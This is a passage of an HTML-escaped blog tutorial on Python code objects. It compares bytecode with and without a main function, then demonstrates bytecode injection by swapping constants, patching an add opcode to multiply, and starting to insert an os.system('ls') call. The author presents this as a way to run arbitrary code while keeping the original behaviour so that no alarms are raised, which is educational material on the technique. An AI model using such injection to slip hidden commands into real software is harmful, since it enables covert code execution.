&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;67108864&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; CALL_FUNCTION            &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; GET_ITER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;gt;&amp;gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; FOR_ITER                 &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;to 18&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; STORE_NAME               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; LOAD_NAME                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; POP_TOP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; JUMP_ABSOLUTE            &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;gt;&amp;gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;None&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; from main_func import main
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; dis.dis&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;main&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_GLOBAL              &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;range&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;67108864&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; CALL_FUNCTION            &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; GET_ITER
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;gt;&amp;gt;    &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; FOR_ITER                 &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;to 18&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; STORE_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;          &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; POP_TOP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; JUMP_ABSOLUTE            &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &amp;gt;&amp;gt;   &lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;None&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;             &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;gt;&amp;gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;They are pretty much the same, but with a few important differences. And those are the following:&lt;/p&gt;
&lt;p&gt;LOAD_NAME  VS LOAD_GLOBAL	(offset 0)
STORE_NAME VS STORE_FAST	(offset 10)
LOAD_NAME  VS LOAD_FAST		(offset 12)&lt;/p&gt;
&lt;p&gt;We know that LOAD_NAME is pushing values from co_names list onto the stack, which is pretty much the same as LOAD_GLOBAL. So no big difference there. Yet, we notice that the naked program is using the global namespace to load / store variables, while the main_func program is using it&amp;rsquo;s local namespace. Since, the global namespace is bigger than the local one, finding stuff is harder. As a result, it takes more time to execute.&lt;/p&gt;
&lt;p&gt;So START USING YOUR MAIN FUNCTION PEOPLE :D&lt;/p&gt;
&lt;h2 id=&#34;injecting-the-code-object&#34;&gt;Injecting the code object&lt;/h2&gt;
&lt;p&gt;Now that we have an idea about how code objects work, let&amp;rsquo;s try playing around with them. Suppose we have this function:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;func&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;func
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_varnames: ()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_names   : ()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_consts  : (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_code    : &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_CONST               &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So what would happen if we modify the &lt;code&gt;co_consts&lt;/code&gt; tuple, will this just return ur value instead ?
The answer is yes, computers are dumb they just do what they&amp;rsquo;re told to, so in this case it would load whatever value is at index 1 in &lt;code&gt;co_consts&lt;/code&gt; and return.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;]: injConsts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;wut happened?&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;]: code_obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;]: code_obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code_obj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(co_consts&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;injConsts)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;]: func&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code_obj
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;]: func()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;]: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;wut happened?&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Let&amp;rsquo;s take it a step further and try to change the bytecode.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;(x, y):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;add
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_varnames: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_names   : ()
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_consts  : (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;,) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_code    : &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;|&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x01\x17\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;S&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Source Line  m  operation&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;byte&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;code      operand (useful name&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;number)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;---------------------------------------------------------------------&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;           &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; (x)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; LOAD_FAST                &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; (y)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; BINARY_ADD
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;              &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; RETURN_VALUE
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We will try to change the &lt;code&gt;BINARY_ADD&lt;/code&gt; instruction to &lt;code&gt;BINARY_multiply&lt;/code&gt;. To do this, firstly we need to convert
the bytecode to int&amp;rsquo;s so we can identify more easily each instruction:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;]: code_obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; add&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;]: bytecode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [x &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; code_obj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;co_code]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;]: bytecode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;]: [&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;We know that the offset of our target is 4, so we change it with the opcode for &lt;code&gt;BINARY_MULTIPLY&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;]: bytecode[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dis&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;opmap[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BINARY_MULTIPLY&amp;#39;&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;]: bytecode
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;]: [&lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now we just need to replace the &lt;code&gt;co_code&lt;/code&gt; attribute with our injected bytecode.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;]: injCode &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes(bytecode)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;]: code_obj &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code_obj&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;replace(co_code&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;injCode)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;]: add&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;__code__ &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; code_obj
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;In [&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;]: add(&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Out[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;]: &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;And voilà we modified the normal execution flow of the funcion.&lt;/p&gt;
&lt;p&gt;Out there in the real world this aproach is not the best, since we completely destroy the original functionality of the targeted bytecode. Therefore, software might brake which may raise some alarms. So a better way do to this is to execute our code at the beginning and after return to the normal execution of the function. For the purposes of this article I will keep it simple and just execute the &lt;code&gt;ls&lt;/code&gt; command, however keep in mind that you can basically execute any python code as long as you modify the other attributes of the code object accordingly (e.g co_varnames, co_consts, etc)&lt;/p&gt;
&lt;p&gt;Consider our previous function &lt;code&gt;add&lt;/code&gt;, but we know want to execute a system command before returning. I think the best way to visualize what we need to achieve is to look at the bytecode of our goal:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;injadd&lt;/span&gt;(x, y):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; os
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	os&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;system(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; x &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; y
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;injadd
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_varnames: (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;y&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_names   : (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;system&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  co_consts  : (&lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ls&amp;#39;&lt;/span&gt;) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
